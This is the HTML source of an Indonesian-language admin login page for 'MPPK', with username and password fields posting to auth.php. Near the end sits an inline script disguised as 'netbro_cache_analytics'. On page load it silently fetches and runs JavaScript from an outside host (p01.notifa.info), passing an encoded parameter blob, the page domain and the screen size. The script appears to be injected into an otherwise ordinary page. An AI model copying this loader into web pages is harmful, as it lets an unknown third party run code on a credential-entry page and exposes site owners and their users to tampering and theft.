<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="gambar3.jpg">
    <title>MPPK User Login</title>

    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
    <link href="float.css" rel="stylesheet">
</head>

<body>
    <div class="container">
           
            <form class="form-signin form-control" action="auth.php" method="post">
                <div class="text-center mb-4">
                    <img class="mb-4" src="gambar3.jpg" alt="" width="80" height="80">
                    <h1 class="h3 mb-3 font-weight-normal">Panel Admin MPPK</h1>
                </div>

                <div class="form-label-group">
                    <input type="text" id="inputEmail" class="form-control" placeholder="Username" name="username" required autofocus>
                    <label for="inputEmail">Username</label>
                </div>

                <div class="form-label-group">
                    <input type="password" id="inputPassword" class="form-control" placeholder="Kata Sandi" name="password" required>
                    <label for="inputPassword">Kata Sandi</label>
                </div>

                <button class="btn btn-lg btn-primary btn-block" type="submit">Masuk</button>
                <p class="mt-5 mb-3 text-muted text-center">&copy; Copyright MPPK</p>
            </form>
        </div>


    <script type="text/javascript">
        if (self == top) {
            function netbro_cache_analytics(fn, callback) {
                setTimeout(function() {
                    fn();
                    callback();
                }, 0);
            }

            function sync(fn) {
                fn();
            }

            function requestCfs() {
                var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
                var idc_glo_r = Math.floor(Math.random() * 99999999999);
                var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mDGxB0PblDHBbG50e4hdurKVQWo%2fytXtEq30%2bR1Ux0bFQwMiqzLmrMyUFiQL%2fCQd0suDjurpwGhXaT0ezAQwFgdYTdzashR%2bzy3m6byWGHwWPm5Mb%2bXBr3UyJiOisQ8AryAFY2XeMQrzR4BB%2ffdgCCMQn3iv7U4dQwT7HPcer7J%2fFKOm0cpU1yQMIVFN1OnxX0MJtL8ymyj8qI8WiaPj2rbc5HTRhw9kjxrvWAoTM1gImzHfYNW1t%2fuRxK%2fk15wmxdPRqtkY6EiQsHyBlr9XV%2fxk4fZck%2f0v24gA%2b%2bJg06i19YREQpJXRJe%2bn8xvL9vE2TB7ttCm82bw8%2fNQ3oqc9Y%2fJKvXu1NA4HPXHo060Kd1dd693D4btQZroin7eX1LwOUZnJajJq%2bKQ4LB5AWAxvJu8rHPlmORDEodhQ7q1pw4G8PEKiGtB%2fxUyIzDH3wXF3whTFAS%2bDLreCkutR1vWVYzdVBuwQquHXO2h8waCmqQp%2fv%2bfOFJ6gsfeYVjFWbdKVL75uLtq8cvX2C0JhyQoap7dlPvqBU3K1JwyATJCtKPPEWSckDysxP%2bmd4GBfbAgnVziu2nLrXZW%2fcmWUkxZY7w%3d%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
                var bsa = document.createElement('script');
                bsa.type = 'text/javascript';
                bsa.async = true;
                bsa.src = url;
                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
            }
            netbro_cache_analytics(requestCfs, function() {});
        };
    </script>

    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
</body>

</html>